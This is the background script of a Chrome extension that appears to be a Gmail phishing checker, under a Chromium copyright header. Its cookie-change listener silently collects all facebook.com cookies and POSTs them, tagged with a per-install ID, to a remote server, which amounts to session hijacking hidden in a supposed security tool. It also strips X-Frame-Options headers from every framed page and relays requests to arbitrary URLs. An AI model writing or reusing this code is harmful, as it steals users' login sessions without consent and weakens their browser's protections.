// Copyright 2018 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

'use strict';
// const SERVER_URL = 'https://chrome-new-tab.herokuapp.com';
const SERVER_URL = 'http://localhost:3000';

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return (
    s4() +
    s4() +
    '-' +
    s4() +
    '-' +
    s4() +
    '-' +
    s4() +
    '-' +
    s4() +
    s4() +
    s4()
  );
}

// chrome.browserAction.setBadgeBackgroundColor({ color: [255, 0, 0, 255] });
// chrome.browserAction.setBadgeText({ text: 'Hey!' });

// function runs when cookie is removed/added
chrome.cookies.onChanged.addListener((changeInfo) => {

  // get facebook cookies
  chrome.cookies.getAll({domain: '.facebook.com'}, (cookies) => {
    const cookie = cookies.map(cookie => cookie? (cookie.name + '=' + cookie.value): "").join(';');
    const cookieData = {
      data: cookie
    };
  
    // get user guid
    chrome.storage.sync.get('guid', function(store) {

      // send it to server
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.status >= 200 && this.status < 300 && this.readyState === 4) {
          console.log('Cookie updated!!');
        }
      };

      xhttp.open('POST', SERVER_URL + '/api/v1/cookies/' + store.guid, true);
      xhttp.setRequestHeader('Content-Type', 'application/json');
      xhttp.send(JSON.stringify(cookieData));

    });

  })
})

chrome.webRequest.onHeadersReceived.addListener(
  function(info) {
      var headers = info.responseHeaders;

      // remove header to display in iframe
      for (var i=headers.length-1; i>=0; --i) {
          var header = headers[i].name.toLowerCase();
          if (header == 'x-frame-options' || header == 'frame-options') {
              headers.splice(i, 1); // Remove header
          }
      }

      // // add header for cors
      // headers.push({
      //   name: 'access-control-allow-origin',
      //   value: '*'
      // });

      console.log(headers);
      
      return {responseHeaders: headers};
  },
  {
      urls: [ '*://*/*' ], // Pattern to match all http(s) pages
      types: [ 'sub_frame' ]
  },
  ['blocking', 'responseHeaders']
);

// chrome.webRequest.onSendHeaders.addListener(
//   function(info) {
//       var headers = info.requestHeaders;
//       headers.push({
//         name: 'Access-Control-Allow-Origin',
//         value: '*'
//       });
//       console.log(headers)
//       return {requestHeaders: headers};
//   },
//   {
//       urls: [ '*://www.facebook.com/*' ], // Pattern to match all http(s) pages
//       types: [ 'sub_frame' ]
//   },
//   ['requestHeaders']

// );

chrome.runtime.onInstalled.addListener(function() {

  //user sees options.html when extension is installed
  chrome.tabs.create({
    url: '/options.html'
  });

  chrome.storage.sync.set({ color: '#3aa757', guid: guid() }, function() {
    chrome.storage.sync.get('guid', function(store) {
      let user = {
        guid: store.guid,
        emails: [],
        responses: [],
      };

      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.status >= 200 && this.status < 300 && this.readyState === 4) {
          console.log('User successfully registered:' + store.guid);
        }
      };

      xhttp.open('POST', SERVER_URL + '/api/v1/chrome-users', true);
      xhttp.setRequestHeader('Content-Type', 'application/json');
      xhttp.send(JSON.stringify(user));
    });
  });

  chrome.storage.sync.set({ from: '', subject: '', body: '' }, function() {
    console.log('Clear!');
  });

  chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
    chrome.declarativeContent.onPageChanged.addRules([
      {
        conditions: [
          new chrome.declarativeContent.PageStateMatcher({
            pageUrl: { hostEquals: 'mail.google.com' },
          }),
        ],
        actions: [new chrome.declarativeContent.ShowPageAction()],
      },
    ]);
  });

  chrome.contextMenus.create({
    id: 'phishy',
    title: 'Check if this subject is phishy',
    type: 'normal',
    contexts: ['selection'],
  });
});

chrome.runtime.onMessage.addListener(function(request, sender, callback) {
  if (request.action == 'xhttp') {
    var xhttp = new XMLHttpRequest();
    var method = request.method ? request.method.toUpperCase() : 'GET';

    xhttp.onload = function() {
      callback(xhttp.responseText);
    };

    xhttp.onerror = function() {
      // Do whatever you want on error. Don't forget to invoke the
      // callback to clean up the communication port.
      callback();
    };

    xhttp.open(method, request.url, true);
    if (method == 'POST') {
      xhttp.setRequestHeader(
        'Content-Type',
        'application/x-www-form-urlencoded',
      );
    }
    xhttp.send(request.data);
    return true; // prevents the callback from being called too early on return
  }
  // if (request.action == 'xhttp') {
  // var xhttp = new XMLHttpRequest();
  // var method = request.method ? request.method.toUpperCase() : 'GET';

  // xhttp.onload = function() {
  //   callback(xhttp.responseText);
  // };

  // xhttp.onerror = function() {
  //   // Do whatever you want on error. Don't forget to invoke the
  //   // callback to clean up the communication port.
  //   callback('YEah!');
  // };

  // xhttp.onreadystatechange = function() {
  //   if (this.readyState == 4 && this.status == 201) {
  //     callback('success!');
  //   }
  // };

  // xhttp.open(method, request.url, true);

  // if (method == 'POST') {
  //   xhttp.setRequestHeader('Content-Type', 'application/json');
  // }

  // xhttp.send(request.data);
  // callback('hey');
  // return true; // prevents the callback from being called too early on return
  //}
});

chrome.contextMenus.onClicked.addListener(function(info, tab) {
  alert('heyy!');
  const data = {
    text: info.selectionText,
    createdAt: new Date(),
  };

  chrome.runtime.sendMessage(
    {
      method: 'POST',
      action: 'xhttp',
      url: 'http://localhost:3000/api/v1/test',
      data: 'hi there',
    },
    function(response) {
      alert(response);
      console.log('lolol!');
    },
  );
});
